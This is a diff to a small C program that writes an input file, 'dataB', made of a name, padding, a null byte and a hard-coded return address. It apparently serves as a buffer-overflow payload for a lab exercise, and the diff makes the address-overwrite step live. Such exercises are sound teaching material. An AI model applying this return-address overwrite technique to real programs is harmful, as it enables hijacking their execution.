@@ -12,13 +12,13 @@ int main(void) {
     FILE *psFile;
     psFile = fopen("dataB", "w");
 
-    fprintf(psFile, "Richard Gomez0000000000000000000000000000000000000000");
-    /* putc('\0', psFile);
-    for(i = 0; i < 49; i++) {
+    fprintf(psFile, "Richard Gomez00000000000000000000000000000000000");
+    putc('\0', psFile);
+    /* for(i = 0; i < 49; i++) {
         putc('\0', psFile);
-    }
+    } */
     bAddress = 0x400858;
-    fwrite(&bAddress, sizeof(unsigned long), 1, psFile); */
+    fwrite(&bAddress, sizeof(unsigned long), 1, psFile);
 
     fclose(psFile);
     return 0;
